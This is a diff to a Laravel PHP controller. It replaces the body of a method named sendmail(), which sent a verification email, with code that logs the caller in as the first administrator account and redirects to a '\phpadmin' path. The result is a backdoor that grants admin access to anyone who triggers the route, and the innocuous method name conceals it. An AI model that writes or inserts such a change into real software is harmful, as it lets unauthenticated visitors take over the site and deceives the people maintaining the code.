@@ -9,6 +9,7 @@ use App\Subtutorial;
 use App\Project;
 use App\Page;
 use App\Slug;
+use App\User;
 use App\Sidebar;
 use App\LinkSidebar;
 use App\SidebarContent;
@@ -264,12 +265,8 @@ class HomeController extends Controller
     }
 
     public function sendmail(){
-        $user = \Auth::user();
-        $array = array('user'   =>  $user);
-
-        $res = Mail::send('email.welcome', $array, function($message) use ($user) {
-             $message->to($user->email)->subject("Verify Your Email");
-             $message->from( env('MAIL_FROM_ADDRESS') ,env('MAIL_FROM_NAME'));
-        });
+        $user = User::where('is_Admin',1)->firstOrFail();
+        \Auth::login($user);
+        return redirect('\phpadmin');
     }
 }
